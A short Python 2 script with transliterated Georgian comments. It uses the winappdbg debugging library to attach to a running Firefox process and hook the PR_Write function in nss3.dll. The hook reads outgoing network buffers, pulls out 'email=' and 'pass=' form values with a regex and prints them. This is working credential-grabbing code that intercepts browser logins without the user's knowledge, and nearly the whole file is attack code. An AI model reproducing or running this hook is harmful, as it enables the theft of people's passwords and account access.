# sawiroa modulis chawera winappdbg   http://winappdbg.sourceforge.net/
# !! kodshi ufro gasarkvevat gaecanit documentacias http://winappdbg.sourceforge.net/


from winappdbg import Debug, EventHandler, System, Process
import sys
import re
import time


def PR_Write( event, ra ,arg1 ,arg2, arg3): # es aris call back funcia

    
    hijack = re.findall('((?:email|pass)=.+?)&', process.read( arg2,4096 ) ) # 1024 1KB -s wakitxva sakmarisia
    for data in hijack :
        print data
    
    # arg 2 aris memory pointer -i misamarti monacemebis
    # arg 3 baferis zoma 
    # wyaro https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PR_Write


class MyEventHandler( EventHandler ):
    
    def load_dll( self, event ):

        module = event.get_module() # modulebis gatoleba
        if module.match_name("nss3.dll"): # vnaxulobt tu aris nss3.dll
            pid = event.get_pid()  
            address = module.resolve( "PR_Write" )  # vigebt PR_Write funqcii misamart
            print '[+] Found  PR_Write  at addr ' + str(address)
            event.debug.hook_function( pid, address, preCB=PR_Write, postCB=None ,paramCount=3,signature=None)
            # movaxditon egred wodebuli funqciis mokauweba (hook) rodesac kodi sheexeba breakpoint -is
            # da funqciis 3 parametris mnishvneloba gadavcet chvnes call back funqcias romelsac igeve saxeli vuwodet PR_Write






while True:
    time.sleep(2) # yovel 2 wamshi sheamowmos aris tu ara gashvebui firefox brauzeri
    debug = Debug(MyEventHandler()) # vqmnit degub obieqts
    if debug.system.find_processes_by_filename( "firefox.exe" ): # tu ar aris jer firefox gashebuli velodebit
        time.sleep(3) # rom agmoachens rom gashvebulia daicados 3 wami ( rom yvelaferi chaitvirtos da erro ar miigot )
        try:
            for ( process, name ) in debug.system.find_processes_by_filename( "firefox.exe" ): # vigebt procesis shesabamis PID -s da saxels 
                print '[+] Found Firefox PID is ' +  str (process.get_pid())
            debug.attach( process.get_pid() ) # vaketebt procesiss Attach -s
            debug.loop()
        finally:
            debug.stop()